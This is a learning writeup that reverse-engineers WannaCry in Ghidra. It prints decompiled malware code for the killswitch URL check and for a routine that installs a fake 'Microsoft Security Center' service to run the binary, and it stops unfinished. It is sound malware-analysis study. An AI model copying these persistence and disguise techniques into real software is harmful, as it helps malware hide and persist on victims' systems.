---
title: WannaCry
parent: Reverse Engineering
nav_order: 1
---

# WannaCry

<img width="1460" height="960" alt="image" src="https://github.com/user-attachments/assets/c5a64826-eb1c-40c3-b4f7-8035f62f1551" />

NOTE: This is following along to StackSmashing's video series: https://www.youtube.com/watch?v=Sv8yu12y5zM

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## What is This?

> This is a writeup documenting my reverse engineering learning process using WannaCry

## Let's Begin!

Looking for the ```entry``` function, we see the following decompiled code 

```c++
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void entry(void)

{
  undefined4 *puVar1;
  uint uVar2;
  HMODULE pHVar3;
  byte *pbVar4;
  undefined4 uVar5;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined1 *local_1c;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d488;
  puStack_10 = &DAT_004076f4;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  ExceptionList = &pvStack_14;
  __set_app_type(2);
  _DAT_0040f94c = 0xffffffff;
  _DAT_0040f950 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0040f948;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0040f944;
  _DAT_0040f954 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_0040793f();
  if (DAT_0040f870 == 0) {
    __setusermatherr(&LAB_0040793c);
  }
  FUN_0040792a();
  initterm(&DAT_0040e008,&DAT_0040e00c);
  local_70.newmode = DAT_0040f940;
  __getmainargs(&local_64,&local_74,&local_68,DAT_0040f93c,&local_70);
  initterm(&DAT_0040e000,&DAT_0040e004);
  pbVar4 = *(byte **)_acmdln_exref;
  if (*pbVar4 != 0x22) {
    do {
      if (*pbVar4 < 0x21) goto LAB_004078ad;
      pbVar4 = pbVar4 + 1;
    } while( true );
  }
  do {
    pbVar4 = pbVar4 + 1;
    if (*pbVar4 == 0) break;
  } while (*pbVar4 != 0x22);
  if (*pbVar4 != 0x22) goto LAB_004078ad;
  do {
    pbVar4 = pbVar4 + 1;
LAB_004078ad:
  } while ((*pbVar4 != 0) && (*pbVar4 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    uVar2 = 10;
  }
  else {
    uVar2 = (uint)local_60.wShowWindow;
  }
  uVar5 = 0;
  pHVar3 = GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_00401fe7(pHVar3,uVar5,pbVar4,uVar2);
                    /* WARNING: Subroutine does not return */
  exit(local_6c);
}
```
This is the decompiled version of the windows entry function with ```local_6c = FUN_00401fe7(pHVar3,uVar5,pbVar4,uVar2);``` being the call the the WinMain API function (```int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow);```) that leads to the actual main function of the program.

We can edit the function signature to get some variable names so the decompiled code looks cleaner, but lets get to the main function of the program.

## WannaCry VM Check

Going into WinMain, we are greeted with the following decompiled code

```c++

int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow)

{
  undefined4 uVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  char local_50 [57];
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined4 local_7;
  undefined2 local_3;
  undefined1 local_1;
  
  pcVar3 = s_http://www.iuqerfsodp9ifjaposdfj_004313d0;
  pcVar4 = local_50;
  for (iVar2 = 0xe; iVar2 != 0; iVar2 = iVar2 + -1) {
    *(undefined4 *)pcVar4 = *(undefined4 *)pcVar3;
    pcVar3 = pcVar3 + 4;
    pcVar4 = pcVar4 + 4;
  }
  *pcVar4 = *pcVar3;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_3 = 0;
  local_1 = 0;
  uVar1 = InternetOpenA(0,1,0,0,0);
  iVar2 = InternetOpenUrlA(uVar1,local_50,0,0,0x84000000,0);
  if (iVar2 == 0) {
    InternetCloseHandle(uVar1);
    InternetCloseHandle(0);
    FUN_00408090();
    return 0;
  }
  InternetCloseHandle(uVar1);
  InternetCloseHandle(iVar2);
  return 0;
}


```

The first thing that pops out to me is the string ```pcVar3```. This looks to be the infamous killswitch so lets rename it ```killswitch_url```.

In this section of the code:

```c++
for (iVar2 = 0xe; iVar2 != 0; iVar2 = iVar2 + -1) {
    *(undefined4 *)pcVar4 = *(undefined4 *)pcVar3;
    pcVar3 = pcVar3 + 4;
    pcVar4 = pcVar4 + 4;
  }
  *pcVar4 = *pcVar3;
```
We see an example of where ghidra struggles in some of its decompilation efforts. If we rename ```pcVar4``` to ```kill_switchurl_copy``` and ```local_50``` to ```buffer``` it becomes fairly certain that this is some sort of string copy.

```c++
  killswitch_url = s_http://www.iuqerfsodp9ifjaposdfj_004313d0;
  killswitch_url_copy = buffer;
  for (iVar2 = 14; iVar2 != 0; iVar2 = iVar2 + -1) {
    *(undefined4 *)killswitch_url_copy = *(undefined4 *)killswitch_url;
    killswitch_url = killswitch_url + 4;
    killswitch_url_copy = killswitch_url_copy + 4;
  }
  *killswitch_url_copy = *killswitch_url;
```
See? Much more legible.

Now, seeing the functions InternetOpenA and InternetOpenUrlA we can assume this is the portion of the code where the worm checks if the url is accessible and then terminates if it is (My favorite theory is that this was a VM check because since that was an unregistered domain it shouldnt resolve but VMs
do some type of VM magic in order to resolve every URL and thats how the worm checks if its in a VM).

By looking at the following decompiled code and the associated MS Docs, we can deduce tnaht this program is trying to open the killswitch URL, and if it fails to open another function is called (this is presumably where the real wannacry malware gets executed). 

```c++
  InternetOpenA((LPCSTR)0,1,(LPCSTR)0,(LPCSTR)0,0);
  hinternet_return = InternetOpenUrlA(hInternet,buffer,(LPCSTR)0,0,2214592512,0);
  if (hinternet_return == (HINTERNET)0) {
    InternetCloseHandle(hInternet);
    InternetCloseHandle(0);
    FUN_00408090(); //If url unsuccessfully opened, call this function
    return 0;
  } //If url successfully opened, terminate
  InternetCloseHandle(hInternet);
  InternetCloseHandle(hinternet_return);
  return 0;
}
```
And if the handle to the url is successfully created, then WannaCry terminates, pretty cool right?

## Failed URL Function (Real WannaCry Code)
Jumping into this function, we see another WinAPI function that contains a filepath to the specified module (GetModuleFileNameA). This retrieves teh filepath of the executable.

```c++
  GetModuleFileNameA((HMODULE)0,(LPSTR)&lpFilename,260);
  argc = (int *)__p___argc();
  if (*argc < 2) {
    not_enough_args_handler();
    return;
  }
```

We then see this code here, which checks if we have enough args supplied to the command line and if not it jumps into another function, lets take a look at that function.

### not_enough_args_handler

Jumping into this function, we see it calls and additional two functions. 

```c++
  undefined4 not_enough_args_handler(void)

{
  FUN_00569cd0();
  FUN_00407ce0();
  return 0;
}
```
Let's jump into the first one!

#### First function call in not enough args handler
Jumping into this first function call, we see teh following decompiled code:

```c++

undefined4 create_service_and_run(void)

{
  SC_HANDLE hSCManager;
  SC_HANDLE hService;
  char exec_w_args_buffer [260];
  
                    /* "C:\Users\user\Desktop wannacry.exxe -m security" */
  sprintf(exec_w_args_buffer,s_%s_-m_security_00431330,&lpFilename);
  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (hSCManager != (SC_HANDLE)0x0) {
    hService = CreateServiceA(hSCManager,s_mssecsvc2.0_004312fc,
                              s_Microsoft_Security_Center_(2.0)_S_00431308,0xf01ff,0x10,2,1,
                              exec_w_args_buffer,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
                              (LPCSTR)0x0);
                    /* 
                       function creates a service named mssecsvc2.0 labeled w the display name as
                       the param after it. The 'lpBinaryPath' param is the path to the wannacry.exe
                       with the -security flag
                       
                       
                        */
    if (hService != (SC_HANDLE)0x0) {
                    /* Then, if the service doesnt fail, the program starts and then closes the
                       handle */
      StartServiceA(hService,0,(LPCSTR *)0x0);
      CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
    return 0;
  }
  return 0;
}


```
I went ahead and added some comments, but essentially, this function stores the path of wannacry with the -security flag in a buffer which is then used in the [CreateServiceA API](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea) to make a fake Microsoft security service.

We then see a simple check that checks to see if the service didn't fail to get created, then to start it and close all handles afterwards.

Lets now jump into the other function call in the not enough args handler function!

#### second function call in not enough args handler


To Be COntinued....



--

Thank you for reading!

